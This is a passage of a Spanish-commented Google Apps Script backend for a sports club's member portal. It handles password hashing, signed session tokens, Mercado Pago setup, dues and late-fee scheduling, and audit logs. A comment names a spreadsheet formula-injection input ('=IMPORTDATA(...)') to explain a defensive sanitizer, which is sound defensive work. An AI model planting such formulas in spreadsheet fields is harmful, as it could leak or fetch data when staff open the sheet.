      if (estadoCol >= 0) sheet.getRange(i + 1, estadoCol + 1).setValue(nuevoEstado);
      if (fcCol >= 0 && (nuevoEstado === 'confirmado' || nuevoEstado === 'rechazado')) {
        sheet.getRange(i + 1, fcCol + 1).setValue(new Date());
      }
      if (notasCol >= 0 && notasExtra) {
        const previo = String(data[i][notasCol] || '').trim();
        const merged = previo ? previo + ' | ' + notasExtra : notasExtra;
        sheet.getRange(i + 1, notasCol + 1).setValue(merged);
      }
      return {
        row: i + 1,
        socio_id: String(data[i][headers.indexOf('socio_id')]).trim(),
        cuotas: String(data[i][headers.indexOf('cuotas_cubiertas')]).split(',').map(function (s) { return s.trim(); }).filter(Boolean),
        monto: Number(data[i][headers.indexOf('monto')]) || 0,
        estado_previo: String(data[i][estadoCol]).trim()
      };
    }
  }
  return null;
}

function getConfig() {
  const sheet = readSheet(SHEET_CONFIG);
  const out = {};
  sheet.rows.forEach(function (row) {
    if (row[0]) out[String(row[0]).trim()] = String(row[1] == null ? '' : row[1]);
  });
  return out;
}

function formatDate(d) {
  const dd = String(d.getDate()).padStart(2, '0');
  const mm = String(d.getMonth() + 1).padStart(2, '0');
  return dd + '/' + mm + '/' + d.getFullYear();
}

// ============================================================
// CSPRNG — bytes/int random de calidad criptográfica
// ============================================================
// Apps Script no expone WebCrypto. `Utilities.getUuid()` SÍ usa CSPRNG
// (UUID v4 con ~122 bits de entropía). Usamos cadena de HMAC-SHA256 keyed
// con UUIDs fresh para amplificar a la cantidad de bytes que necesitemos.
function randomBytes_(n) {
  const seed = Utilities.getUuid() + '|' + Utilities.getUuid() + '|' + Date.now();
  let pool = Utilities.computeHmacSha256Signature(seed, Utilities.getUuid());
  while (pool.length < n) {
    pool = pool.concat(Utilities.computeHmacSha256Signature(pool, Utilities.getUuid()));
  }
  return pool.slice(0, n);
}

// [min, max] inclusive. range debe ser <= 2^31. Bias de módulo para
// rangos chicos (≤ 10^6) es < 1/2^11, despreciable.
function randomInt_(min, max) {
  const range = max - min + 1;
  const bytes = randomBytes_(4);
  let n = 0;
  for (let i = 0; i < 4; i++) n = (n * 256) + (bytes[i] & 0xff);
  return min + (n % range);
}

// ============================================================
// Hash de contraseñas — PBKDF2-HMAC-SHA256 (20k iteraciones)
// + verificación retrocompatible con el formato sha256 legacy.
// ============================================================
const PBKDF2_ITERATIONS = 20000;

function hashPassword(password) {
  const saltBytes = randomBytes_(16);
  const saltB64 = Utilities.base64Encode(saltBytes);
  const hashHex = pbkdf2Sha256Hex_(password, saltB64, PBKDF2_ITERATIONS);
  return 'pbkdf2:' + PBKDF2_ITERATIONS + ':' + saltB64 + ':' + hashHex;
}

function verifyPassword(password, stored) {
  if (!stored) return false;
  const parts = String(stored).split(':');
  // Formato nuevo: pbkdf2:<iterations>:<salt_b64>:<hash_hex>
  if (parts.length === 4 && parts[0] === 'pbkdf2') {
    const iters = parseInt(parts[1], 10);
    if (!iters || iters < 1000 || iters > 1000000) return false; // sanity bounds
    const expected = parts[3];
    const actual = pbkdf2Sha256Hex_(password, parts[2], iters);
    return constantTimeEqual(expected, actual);
  }
  // Formato legacy: sha256:<salt>:<hash_hex>. Aceptamos para no romper cuentas
  // viejas, pero al loguear con éxito se re-hashean a PBKDF2 (ver upgradePasswordHash_).
  if (parts.length === 3 && parts[0] === 'sha256') {
    const expected = parts[2];
    const actual = sha256(parts[1] + ':' + password);
    return constantTimeEqual(expected, actual);
  }
  return false;
}

// PBKDF2-HMAC-SHA256 manual (Apps Script no tiene crypto.subtle).
// Devuelve 32 bytes derivados como hex (un solo bloque, suficiente).
function pbkdf2Sha256Hex_(password, saltB64, iterations) {
  const passwordBytes = Utilities.newBlob(String(password)).getBytes();
  // Re-padding por si el salt fue almacenado sin '=' al final (formato viejo)
  let pad = saltB64.length % 4;
  let padded = saltB64;
  if (pad === 2) padded += '==';
  else if (pad === 3) padded += '=';
  const saltBytes = Utilities.base64Decode(padded);
  // INT(1) big-endian = 4 bytes [0,0,0,1]; alcanza para 32 bytes de output
  const block = saltBytes.concat([0, 0, 0, 1]);

  let u = Utilities.computeHmacSha256Signature(block, passwordBytes);
  const result = u.slice();
  for (let i = 1; i < iterations; i++) {
    u = Utilities.computeHmacSha256Signature(u, passwordBytes);
    for (let j = 0; j < result.length; j++) result[j] ^= u[j];
  }
  return result.map(function (b) { return ('0' + (b & 0xff).toString(16)).slice(-2); }).join('');
}

function sha256(text) {
  const raw = Utilities.computeDigest(
    Utilities.DigestAlgorithm.SHA_256,
    text,
    Utilities.Charset.UTF_8
  );
  return raw.map(function (b) { return ('0' + (b & 0xff).toString(16)).slice(-2); }).join('');
}

function constantTimeEqual(a, b) {
  if (a.length !== b.length) return false;
  let diff = 0;
  for (let i = 0; i < a.length; i++) diff |= a.charCodeAt(i) ^ b.charCodeAt(i);
  return diff === 0;
}

// Sheet-safe: si el string empieza con un caracter que Google Sheets interpreta
// como fórmula (=, +, -, @, tab, CR), le anteponemos un '. Esto neutraliza
// "CSV/Sheets injection" — un atacante que se registra como nombre
// "=IMPORTDATA(...)" no consigue ejecutar fórmulas cuando la secretaría
// abre la planilla.
function sheetSafe_(value) {
  const s = String(value == null ? '' : value);
  if (/^[=+\-@\t\r]/.test(s)) return "'" + s;
  return s;
}

// Re-hashea con PBKDF2 una contraseña que entró con formato sha256 legacy.
// Best-effort: si falla, no rompe el login.
function upgradePasswordHash_(email, password) {
  try {
    const sheet = SpreadsheetApp.getActive().getSheetByName(SHEET_SOCIOS);
    if (!sheet) return;
    const data = sheet.getDataRange().getValues();
    const headers = data[0].map(String);
    const emailCol = headers.indexOf('email');
    const hashCol = headers.indexOf('password_hash');
    if (emailCol < 0 || hashCol < 0) return;
    for (let i = 1; i < data.length; i++) {
      if (String(data[i][emailCol]).toLowerCase().trim() === email) {
        sheet.getRange(i + 1, hashCol + 1).setValue(hashPassword(password));
        log('upgrade', email, 'rehash', 'sha256_to_pbkdf2');
        return;
      }
    }
  } catch (e) { /* swallow */ }
}

// ============================================================
// Tokens de sesión (HMAC firmado)
// ============================================================
function getSecret() {
  const secret = PropertiesService.getScriptProperties().getProperty(SECRET_PROP);
  if (!secret) throw new Error('HMAC_SECRET no configurado. Corré "Inicializar secreto HMAC" desde el menú Club Admin.');
  return secret;
}

function signToken(payload) {
  const b64 = base64UrlEncode_(JSON.stringify(payload));
  const sig = hmacSha256(b64, getSecret());
  return b64 + '.' + sig;
}

function verifyToken(token) {
  if (!token) return null;
  const parts = String(token).split('.');
  if (parts.length !== 2) return null;
  const expected = hmacSha256(parts[0], getSecret());
  if (!constantTimeEqual(expected, parts[1])) return null;
  try {
    const payload = JSON.parse(base64UrlDecode_(parts[0]));
    if (payload.exp && payload.exp < Date.now()) return null;
    return payload;
  } catch (e) { return null; }
}

// Identificador derivado del password_hash actual del socio. Lo metemos en el
// token al firmarlo. Cuando el hash cambia (reset de password, auto-upgrade
// de sha256→pbkdf2, edición manual de la planilla), este valor cambia y los
// tokens viejos dejan de validar — invalidación efectiva de sesiones.
function passwordCheck_(passwordHash) {
  if (!passwordHash) return '';
  return sha256(String(passwordHash)).substring(0, 12);
}

// Validación combinada: firma válida + no expirado + pwd_check matchea
// el hash actual del socio. Centraliza la lógica para todos los handlers
// que reciben un token de sesión.
function verifyTokenForSocio_(token, socio) {
  const payload = verifyToken(token);
  if (!payload) return null;
  if (payload.pwd_check) {
    const expected = passwordCheck_(socio && socio.password_hash);
    if (!constantTimeEqual(payload.pwd_check, expected)) return null;
  }
  return payload;
}

function hmacSha256(text, key) {
  const raw = Utilities.computeHmacSha256Signature(text, key);
  return raw.map(function (b) { return ('0' + (b & 0xff).toString(16)).slice(-2); }).join('');
}

function base64UrlEncode_(text) {
  return Utilities.base64EncodeWebSafe(text).replace(/=+$/, '');
}

function base64UrlDecode_(b64) {
  const pad = b64.length % 4;
  const padded = pad ? b64 + '===='.slice(pad) : b64;
  return Utilities.newBlob(Utilities.base64DecodeWebSafe(padded)).getDataAsString();
}

// ============================================================
// Auditoría
// ============================================================
function log(type, email, action, result) {
  try {
    const sheet = SpreadsheetApp.getActive().getSheetByName(SHEET_AUDIT);
    if (!sheet) return;
    sheet.appendRow([new Date(), type, email, action, result]);
  } catch (e) { /* swallow */ }
}

// Para logs de eventos no exitosos no queremos persistir el email en claro:
// (a) acumula PII en la planilla, (b) si un usuario tipea su password en el
// campo email por error queda en el log para siempre. Hasheamos a un prefijo
// corto que sigue sirviendo para correlacionar intentos del mismo email.
function maskEmailForLog_(email) {
  const e = String(email == null ? '' : email).toLowerCase().trim();
  if (!e) return '';
  // Si ni siquiera parece un email válido, NO lo logueamos (puede ser una
  // password tipeada en el campo equivocado).
  if (!/^[a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,}$/.test(e)) return 'sha:invalid';
  return 'sha:' + sha256(e).substring(0, 12);
}

// ============================================================
// Menú admin (visible al abrir la planilla)
// ============================================================
function onOpen() {
  SpreadsheetApp.getUi()
    .createMenu('Club Admin')
    .addItem('1. Inicializar estructura de hojas', 'setupSheets')
    .addItem('2. Inicializar secreto HMAC', 'initSecret')
    .addItem('3. Instalar tareas automáticas (cuotas y recargos)', 'installAutoTasks')
    .addSeparator()
    .addItem('Hashear contraseñas pendientes', 'hashPendingPasswords')
    .addItem('Generar contraseña aleatoria (mostrar)', 'generateRandomPassword')
    .addSeparator()
    .addItem('Configurar token de Mercado Pago', 'configureMpToken')
    .addItem('Verificar token de Mercado Pago', 'verifyMpToken')
    .addItem('Borrar token de Mercado Pago', 'removeMpToken')
    .addSeparator()
    .addSubMenu(SpreadsheetApp.getUi().createMenu('Tareas automáticas')
      .addItem('Ejecutar cuotas/recargos ahora', 'runDailyNow')
      .addItem('Hacer backup ahora', 'backupNow')
      .addSeparator()
      .addItem('Ver tareas instaladas', 'viewInstalledTasks')
      .addItem('Reinstalar todas las tareas', 'installAutoTasks')
      .addItem('Desinstalar todas las tareas', 'removeAutoTasks'))
    .addToUi();
}

function setupSheets() {
  const ss = SpreadsheetApp.getActive();
  const defs = {};
  defs[SHEET_SOCIOS] = ['socio_id', 'email', 'password_hash', 'password_plain', 'nombre', 'dni', 'dorsal', 'categoria', 'telefono', 'estado', 'fecha_alta'];
  defs[SHEET_CUOTAS] = ['cuota_id', 'socio_id', 'email', 'mes', 'anio', 'monto', 'monto_pagado', 'recargo', 'estado', 'fecha_vencimiento', 'fecha_pago'];
  defs[SHEET_CONFIG] = ['clave', 'valor'];
  defs[SHEET_AUDIT]  = ['timestamp', 'type', 'email', 'action', 'result'];
  defs[SHEET_PAGOS]  = ['pago_id', 'socio_id', 'fecha', 'monto', 'metodo', 'referencia', 'cuotas_cubiertas', 'estado', 'fecha_confirmacion', 'notas'];

  Object.keys(defs).forEach(function (name) {
    let sheet = ss.getSheetByName(name);
    if (!sheet) sheet = ss.insertSheet(name);
    if (sheet.getLastRow() === 0) {
      sheet.appendRow(defs[name]);
      sheet.getRange(1, 1, 1, defs[name].length)
        .setFontWeight('bold').setBackground('#0a2472').setFontColor('#ffffff');
      sheet.setFrozenRows(1);
    } else {
      // Migración no destructiva: agregar columnas faltantes al final
      const existing = sheet.getRange(1, 1, 1, sheet.getLastColumn()).getValues()[0].map(String);
      const missing = defs[name].filter(function (h) { return existing.indexOf(h) === -1; });
      if (missing.length > 0) {
        const startCol = sheet.getLastColumn() + 1;
        sheet.getRange(1, startCol, 1, missing.length).setValues([missing]);
        sheet.getRange(1, startCol, 1, missing.length)
          .setFontWeight('bold').setBackground('#0a2472').setFontColor('#ffffff');
      }
    }
  });

  // Pre-cargar Config con placeholders si está vacía
  const cfg = ss.getSheetByName(SHEET_CONFIG);
  if (cfg.getLastRow() === 1) {
    [
      ['titular',                       'Club S. y D. Agronomía Central'],
      ['cuit',                          '30-XXXXXXXX-X'],
      ['cbu',                           'XXXXXXXXXXXXXXXXXXXXXX'],
      ['alias',                         'AGRONOMIA.CENTRAL.AC'],
      ['mp_alias',                      'agronomiacentral.mp'],
      ['mp_link',                       ''],
      ['whatsapp',                      '541145242225'],
      ['telefono_secretaria',           '+541145242225'],
      ['notification_email',            ''],
      ['direccion_pago',                'Bauness 958'],
      ['horario_pago',                  'Lun a Vie 18 a 22 hs · Sábados 10 a 14 hs'],
      ['dia_debito',                    'Los 5 de cada mes'],
      // ---- Auto-generación de cuotas y recargos ----
      ['auto_generar_cuotas',           'si'],     // si | no — apaga el cron sin desinstalarlo
      ['cuota_monto_base',              '15000'],  // monto en pesos de la cuota mensual
      ['cuota_dia_vencimiento',         '10'],     // día del mes en que vence la cuota
      ['recargo_monto',                 '3000'],   // recargo fijo cuando una cuota está muy vencida
      ['recargo_dias_post_vencimiento', '60'],     // días después del vencimiento para aplicar el recargo
      // ---- Mails al socio + backup ----
      ['site_url',                      ''],       // URL pública del sitio. Se incluye en los mails al socio.
      ['backup_folder_id',              '']        // ID de carpeta de Drive donde guardar los backups. Vacío = misma carpeta de la planilla.
    ].forEach(function (r) { cfg.appendRow(r); });
  }

  // Backfill de socio_id en Socios + cuota_id, monto_pagado, socio_id en Cuotas
  const migrationResult = backfillIds_();

  SpreadsheetApp.getUi().alert(
    'Estructura de hojas lista.\n\n' +
    '• Socios: agregadas columnas socio_id, dni, estado, fecha_alta.\n' +
    '• Cuotas: agregadas columnas cuota_id, socio_id, monto_pagado, fecha_vencimiento.\n' +
    '• Hoja Pagos creada (audit trail de pagos).\n\n' +
    'Migración aplicada:\n' +
    '• ' + migrationResult.sociosBackfilled + ' socio_id(s) generados.\n' +
    '• ' + migrationResult.cuotasBackfilled + ' cuotas vinculadas a socios.\n' +
    '• ' + migrationResult.pagadosBackfilled + ' cuotas pagadas con monto_pagado completado.\n\n' +
    'Si ves errores en cuotas (sin socio_id), probablemente es porque el email no matchea con ningún socio. Revisalo a mano.'
  );
}

function backfillIds_() {
  const ss = SpreadsheetApp.getActive();
  const result = { sociosBackfilled: 0, cuotasBackfilled: 0, pagadosBackfilled: 0 };

  // ---- Socios: generar socio_id donde falte ----
  const socios = ss.getSheetByName(SHEET_SOCIOS);
  const sdata = socios.getDataRange().getValues();
  const sheaders = sdata[0].map(String);
  const sIdCol = sheaders.indexOf('socio_id');
  const sEmailCol = sheaders.indexOf('email');

  // Encontrar el último socio_id usado
  let maxId = 0;
  for (let i = 1; i < sdata.length; i++) {
    const id = String(sdata[i][sIdCol] || '');
    const m = id.match(/^AC-(\d+)$/);
    if (m) maxId = Math.max(maxId, parseInt(m[1], 10));
  }

  // Asignar a los que no tienen
  const emailToSocioId = {};
  for (let i = 1; i < sdata.length; i++) {
    let id = String(sdata[i][sIdCol] || '').trim();
    const email = String(sdata[i][sEmailCol] || '').toLowerCase().trim();
    if (!id && email) {
      maxId++;
      id = 'AC-' + ('0000' + maxId).slice(-4);
      socios.getRange(i + 1, sIdCol + 1).setValue(id);
      result.sociosBackfilled++;
    }
    if (email && id) emailToSocioId[email] = id;
  }

  // ---- Cuotas: vincular socio_id, generar cuota_id, completar monto_pagado ----
  const cuotas = ss.getSheetByName(SHEET_CUOTAS);
  const cdata = cuotas.getDataRange().getValues();
  const ch = cdata[0].map(String);
  const cIdCol = ch.indexOf('cuota_id');
  const cSidCol = ch.indexOf('socio_id');
  const cEmailCol = ch.indexOf('email');
  const cMesCol = ch.indexOf('mes');
  const cAnioCol = ch.indexOf('anio');
  const cMontoCol = ch.indexOf('monto');
  const cMpCol = ch.indexOf('monto_pagado');
  const cEstadoCol = ch.indexOf('estado');

  for (let i = 1; i < cdata.length; i++) {
    const row = cdata[i];

    // 1) socio_id desde email si falta
    let sid = String(row[cSidCol] || '').trim();
    if (!sid && cEmailCol >= 0) {
      const email = String(row[cEmailCol] || '').toLowerCase().trim();
      sid = emailToSocioId[email] || '';
      if (sid) {
        cuotas.getRange(i + 1, cSidCol + 1).setValue(sid);
        result.cuotasBackfilled++;
      }
    }

    // 2) cuota_id si falta
    if (!String(row[cIdCol] || '').trim() && sid && row[cMesCol] && row[cAnioCol]) {
      const mn = MES_NUM[String(row[cMesCol]).trim()];
      if (mn) {
        const cid = sid + '-' + row[cAnioCol] + ('0' + mn).slice(-2);
        cuotas.getRange(i + 1, cIdCol + 1).setValue(cid);
      }
    }

    // 3) monto_pagado si falta: pagado=monto, sino 0
    if (cMpCol >= 0 && (row[cMpCol] === '' || row[cMpCol] == null)) {
      const estadoOld = String(row[cEstadoCol] || '').toLowerCase().trim();
      const monto = Number(row[cMontoCol]) || 0;
      const pagado = estadoOld === 'pagado' ? monto : 0;
      cuotas.getRange(i + 1, cMpCol + 1).setValue(pagado);
      if (pagado > 0) result.pagadosBackfilled++;
    }
  }

  return result;
}

function initSecret() {
  const props = PropertiesService.getScriptProperties();
  if (props.getProperty(SECRET_PROP)) {
    SpreadsheetApp.getUi().alert('El secreto HMAC ya está configurado. Si querés rotarlo, borralo desde Project Settings → Script Properties.');
    return;
  }
  // 32 bytes desde randomBytes_ (CSPRNG via UUID v4 + HMAC chain)
  const secret = Utilities.base64Encode(randomBytes_(32));
  props.setProperty(SECRET_PROP, secret);
  SpreadsheetApp.getUi().alert('Secreto HMAC generado y guardado en Script Properties.');
}

function hashPendingPasswords() {
  const sheet = SpreadsheetApp.getActive().getSheetByName(SHEET_SOCIOS);
  if (!sheet) { SpreadsheetApp.getUi().alert('Falta la hoja Socios. Ejecutá "Inicializar estructura de hojas" primero.'); return; }

  const data = sheet.getDataRange().getValues();
  const headers = data[0];
  const plainCol = headers.indexOf('password_plain');
  const hashCol = headers.indexOf('password_hash');
  if (plainCol < 0 || hashCol < 0) {
    SpreadsheetApp.getUi().alert('Faltan columnas password_plain o password_hash.');
    return;
  }

  let count = 0;
  for (let i = 1; i < data.length; i++) {
    const plain = data[i][plainCol];
    if (plain != null && String(plain).trim().length > 0) {
      const hash = hashPassword(String(plain).trim());
      sheet.getRange(i + 1, hashCol + 1).setValue(hash);
      sheet.getRange(i + 1, plainCol + 1).clearContent();
      count++;
    }
  }
  SpreadsheetApp.getUi().alert('Listo. Hasheadas y borradas ' + count + ' contraseña(s).');
}

function generateRandomPassword() {
  const chars = 'abcdefghijkmnpqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ23456789';
  let pass = '';
  for (let i = 0; i < 12; i++) pass += chars.charAt(randomInt_(0, chars.length - 1));
  SpreadsheetApp.getUi().alert(
    'Contraseña sugerida (copiala y pegala en password_plain del socio):\n\n' + pass
  );
}

// ============================================================
// Configuración de Mercado Pago
// ============================================================
function configureMpToken() {
  const ui = SpreadsheetApp.getUi();
  const result = ui.prompt(
    'Configurar Mercado Pago',
    'Pegá el Access Token de Producción de la cuenta de MP del club.\n' +
    'Obtenlo en: https://www.mercadopago.com.ar/developers/panel/app\n\n' +
    'Empieza con "APP_USR-" (producción) o "TEST-" (sandbox).',
    ui.ButtonSet.OK_CANCEL
  );
  if (result.getSelectedButton() !== ui.Button.OK) return;
  const token = result.getResponseText().trim();
  if (!token) { ui.alert('Token vacío. No se guardó nada.'); return; }
  if (!/^(APP_USR-|TEST-)/.test(token)) {
    ui.alert('Aviso: el token no parece tener el prefijo esperado (APP_USR- o TEST-). Igual lo guardo, revisá que sea correcto.');
  }
  PropertiesService.getScriptProperties().setProperty(MP_TOKEN_PROP, token);
  ui.alert('Token de Mercado Pago guardado. Probá hacer un pago desde el portal del socio para verificar que anda.');
}

function verifyMpToken() {
  const ui = SpreadsheetApp.getUi();
  const token = PropertiesService.getScriptProperties().getProperty(MP_TOKEN_PROP);
  if (!token) { ui.alert('No hay token configurado.'); return; }

  // Hacemos un GET liviano contra MP para verificar que responde 200
  try {
    const res = UrlFetchApp.fetch(MP_API_BASE + '/users/me', {
      method: 'get',
      headers: { 'Authorization': 'Bearer ' + token },
      muteHttpExceptions: true
    });
    const status = res.getResponseCode();
    if (status === 200) {
      const data = JSON.parse(res.getContentText());
      const env = token.indexOf('TEST-') === 0 ? 'SANDBOX (modo prueba)' : 'PRODUCCIÓN';
      ui.alert(
        'Token OK ✓\n\n' +
        'Modo: ' + env + '\n' +
        'Cuenta: ' + (data.nickname || data.email || 'desconocida') + '\n' +
        'ID: ' + (data.id || 'n/a')
      );
    } else {
      ui.alert('El token NO funciona. Status HTTP: ' + status + '\n\n' + res.getContentText().substring(0, 300));
    }
  } catch (err) {
    ui.alert('Error verificando: ' + err.message);
  }
}

function removeMpToken() {
  const ui = SpreadsheetApp.getUi();
  const result = ui.alert('¿Borrar el token de Mercado Pago?', ui.ButtonSet.YES_NO);
  if (result === ui.Button.YES) {
    PropertiesService.getScriptProperties().deleteProperty(MP_TOKEN_PROP);
    ui.alert('Token borrado. Los pagos por MP quedan deshabilitados hasta configurarlo de nuevo.');
  }
}

// ============================================================
// Cron diario — auto-generación de cuotas + recargos por mora
// ============================================================
const TRIGGER_HANDLER_DAILY = 'dailyRun';

/**
 * Tarea programada que corre todos los días a la hora configurada.
 * 1) Asegura que cada socio activo tenga la cuota del mes corriente.
 * 2) Aplica recargo a cuotas vencidas hace más de N días sin recargo.
 *
 * Es 100% idempotente: correrla 10 veces el mismo día no duplica nada.
 */
function dailyRun() {
  try {
    const config = getConfig();
    const auto = String(config.auto_generar_cuotas || 'si').toLowerCase();
    let creadas = 0, recargadas = 0;
    if (auto === 'si' || auto === 'true' || auto === '1' || auto === 'yes') {
      creadas = ensureCurrentCuotas_(config);
    }
    recargadas = applyRecargos_(config);
    log('cron', '', 'dailyRun', 'creadas=' + creadas + ' recargos=' + recargadas);
  } catch (err) {
    log('error', '', 'dailyRun', String(err && err.message || err));
    throw err;
  }
}

/**
 * Genera la cuota del mes actual para cada socio en estado=activo que aún no la tenga.
 * Usa cuota_id determinístico (socio_id-AAAAMM) → no hay duplicados aunque corra 100 veces.
 */
function ensureCurrentCuotas_(config) {
  const monto = Number(config.cuota_monto_base) || 0;
  if (monto <= 0) return 0; // sin monto configurado, no hace nada

  const ss = SpreadsheetApp.getActive();
  const socios = ss.getSheetByName(SHEET_SOCIOS);
  const cuotas = ss.getSheetByName(SHEET_CUOTAS);
  if (!socios || !cuotas) return 0;

  const now = new Date();
  const mesNum = now.getMonth() + 1;
  const anio = now.getFullYear();
  const mesNombre = MES_NOMBRES_[mesNum - 1];

  const diaVenc = Math.min(28, Math.max(1, Number(config.cuota_dia_vencimiento) || 10));
  const fechaVenc = new Date(anio, mesNum - 1, diaVenc);

  const sdata = socios.getDataRange().getValues();
  const sh = sdata[0].map(String);
  const sIdCol = sh.indexOf('socio_id');
  const sEstadoCol = sh.indexOf('estado');
  const sEmailCol = sh.indexOf('email');

  // Cargar set de cuota_ids que ya existen (vienen llenos por la migración o por el cron previo)
  const cdata = cuotas.getDataRange().getValues();
  const ch = cdata[0].map(String);
  const cIdCol = ch.indexOf('cuota_id');
  if (cIdCol < 0) return 0;
  const existing = {};
  for (let i = 1; i < cdata.length; i++) {
    const id = String(cdata[i][cIdCol] || '').trim();
    if (id) existing[id] = true;
  }

  const newRows = [];
  for (let i = 1; i < sdata.length; i++) {
    const sid = String(sdata[i][sIdCol] || '').trim();
    const estado = String(sdata[i][sEstadoCol] || 'activo').toLowerCase().trim();
    const email = String(sdata[i][sEmailCol] || '').toLowerCase().trim();
    if (!sid || estado !== 'activo') continue;

    const cuotaId = sid + '-' + anio + ('0' + mesNum).slice(-2);
    if (existing[cuotaId]) continue;

    const newRow = ch.map(function (h) {
      switch (h) {
        case 'cuota_id':          return cuotaId;
        case 'socio_id':          return sid;
        case 'email':             return email;
        case 'mes':               return mesNombre;
        case 'anio':              return anio;
        case 'monto':             return monto;
        case 'monto_pagado':      return 0;
        case 'recargo':           return 0;
        case 'estado':            return 'pendiente';
        case 'fecha_vencimiento': return fechaVenc;
        case 'fecha_pago':        return '';
        default:                  return '';
      }
    });
    newRows.push(newRow);
  }

  if (newRows.length > 0) {
    cuotas.getRange(cuotas.getLastRow() + 1, 1, newRows.length, ch.length).setValues(newRows);
  }
  return newRows.length;
}

/**
 * Aplica recargo a cuotas que cumplen TODAS estas condiciones:
 *  - estado != pagado (todavía deben algo)
 *  - tienen fecha_vencimiento
 *  - hace más de `recargo_dias_post_vencimiento` que vencieron
 *  - todavía no se les aplicó recargo (recargo == 0)
 *
 * Una cuota recibe el recargo una sola vez. Si querés recargos progresivos
 * (otro a los 90 días, otro a los 120) extender esta función.
 */
function applyRecargos_(config) {
  const recargoMonto = Number(config.recargo_monto) || 0;
  const recargoDias = Number(config.recargo_dias_post_vencimiento) || 60;
  if (recargoMonto <= 0) return 0;

  const cuotas = SpreadsheetApp.getActive().getSheetByName(SHEET_CUOTAS);
  if (!cuotas) return 0;
  const data = cuotas.getDataRange().getValues();
  const h = data[0].map(String);
  const fvCol = h.indexOf('fecha_vencimiento');
  const recCol = h.indexOf('recargo');
  const estadoCol = h.indexOf('estado');
  const montoCol = h.indexOf('monto');
  const mpCol = h.indexOf('monto_pagado');
  if (fvCol < 0 || recCol < 0) return 0;

  const today = new Date();
  let applied = 0;
  for (let i = 1; i < data.length; i++) {
    const row = data[i];

    // Skip cuotas pagadas (computamos estado real, no confiamos en la columna)
    const monto = Number(row[montoCol]) || 0;
    const pagado = mpCol >= 0 ? (Number(row[mpCol]) || 0) : 0;
    const recActual = Number(row[recCol]) || 0;
    if (pagado >= monto + recActual && monto > 0) continue;

    const fv = row[fvCol];
    if (!(fv instanceof Date)) continue;

    if (recActual > 0) continue; // ya tenía recargo

    const diasVencido = Math.floor((today.getTime() - fv.getTime()) / (1000 * 60 * 60 * 24));
    if (diasVencido >= recargoDias) {
      cuotas.getRange(i + 1, recCol + 1).setValue(recargoMonto);
      // También sincronizamos la columna estado (visible para la secretaría)
      if (estadoCol >= 0) {
        const nuevoEstado = pagado === 0 ? 'pendiente' : (pagado >= monto + recargoMonto ? 'pagado' : 'parcial');
        cuotas.getRange(i + 1, estadoCol + 1).setValue(nuevoEstado);
      }
      applied++;
    }
  }
  return applied;
}

const MES_NOMBRES_ = ['Enero','Febrero','Marzo','Abril','Mayo','Junio','Julio','Agosto','Septiembre','Octubre','Noviembre','Diciembre'];

// ---- Admin de triggers (menú Club Admin) ----

// Inlined a propósito: const en V8 tiene "temporal dead zone", si referenciamos
// TRIGGER_HANDLER_WEEKLY antes de su declaración explota con ReferenceError.
const MANAGED_HANDLERS_ = ['dailyRun', 'weeklyBackup', 'handleEdit'];

function installAutoTasks() {
  const ui = SpreadsheetApp.getUi();

  // Limpiar triggers viejos del mismo conjunto
  let removed = 0;
  ScriptApp.getProjectTriggers().forEach(function (t) {
    if (MANAGED_HANDLERS_.indexOf(t.getHandlerFunction()) >= 0) {
      ScriptApp.deleteTrigger(t);
      removed++;
    }
  });

  // 1. Diario ~3 AM: cuotas mensuales + recargos por mora
  ScriptApp.newTrigger(TRIGGER_HANDLER_DAILY)
    .timeBased().everyDays(1).atHour(3).create();

  // 2. Semanal (domingos ~4 AM): backup completo de la planilla a Drive
  ScriptApp.newTrigger(TRIGGER_HANDLER_WEEKLY)
    .timeBased().everyWeeks(1).onWeekDay(ScriptApp.WeekDay.SUNDAY).atHour(4).create();

  // 3. onEdit instalable: mail al socio cuando cambia su estado
  ScriptApp.newTrigger('handleEdit')
    .forSpreadsheet(SpreadsheetApp.getActive())
    .onEdit().create();

  ui.alert(
    'Tareas instaladas ✓\n\n' +
    '• Diaria (~3 AM): genera cuotas mensuales y aplica recargos por mora.\n' +
    '• Semanal (domingos ~4 AM): backup completo de la planilla a Drive.\n' +
    '• Al editar la columna "estado" en Socios: manda mail al socio cuando se aprueba o rechaza.\n\n' +
    'Configurá en hoja Config:\n' +
    '  • cuota_monto_base, cuota_dia_vencimiento, recargo_monto, recargo_dias_post_vencimiento\n' +
    '  • auto_generar_cuotas — "si" o "no" para apagar el cron sin desinstalarlo\n' +
    '  • site_url — URL pública del sitio (se incluye en los mails al socio)\n' +
    '  • backup_folder_id — opcional, ID de carpeta de Drive para los backups\n\n' +
    'Importante: activá las notificaciones de error en Apps Script → Triggers → Failure notification → "Notify me immediately".\n\n' +
    (removed > 0 ? '(Limpiadas ' + removed + ' tareas duplicadas que tenías)' : '')
  );
}

function removeAutoTasks() {
  const ui = SpreadsheetApp.getUi();
  const r = ui.alert(
    '¿Desinstalar todas las tareas automáticas?\n\nDeja de generar cuotas, aplicar recargos, hacer backups y mandar mails al socio.',
    ui.ButtonSet.YES_NO
  );
  if (r !== ui.Button.YES) return;
  let removed = 0;
  ScriptApp.getProjectTriggers().forEach(function (t) {
    if (MANAGED_HANDLERS_.indexOf(t.getHandlerFunction()) >= 0) {
      ScriptApp.deleteTrigger(t);
      removed++;
    }
  });
  ui.alert('Tareas desinstaladas: ' + removed);
}

function runDailyNow() {
  const ui = SpreadsheetApp.getUi();
  const r = ui.alert(
    'Ejecutar las tareas ahora\n\n' +
    'Esto va a:\n' +
    '  • Generar la cuota del mes corriente para todos los activos que no la tengan.\n' +
    '  • Aplicar recargos a cuotas vencidas.\n\n' +
    'Es seguro correrlo varias veces (es idempotente). ¿Avanzo?',
    ui.ButtonSet.YES_NO
  );
  if (r !== ui.Button.YES) return;
  try {
    dailyRun();
    ui.alert('Ejecutado. Revisá hoja Auditoria para ver qué se generó/aplicó.');
  } catch (err) {
    ui.alert('Error al ejecutar: ' + err.message);
  }
}

function viewInstalledTasks() {
  const ui = SpreadsheetApp.getUi();
  const triggers = ScriptApp.getProjectTriggers();
  if (triggers.length === 0) { ui.alert('No hay tareas automáticas instaladas.'); return; }
  let msg = 'Tareas instaladas (' + triggers.length + '):\n\n';
  triggers.forEach(function (t) {
    msg += '• Función: ' + t.getHandlerFunction() + '\n';
    msg += '  Tipo: ' + t.getEventType() + '\n';
    msg += '  ID: ' + t.getUniqueId() + '\n\n';
  });
  ui.alert(msg);
}

// ============================================================
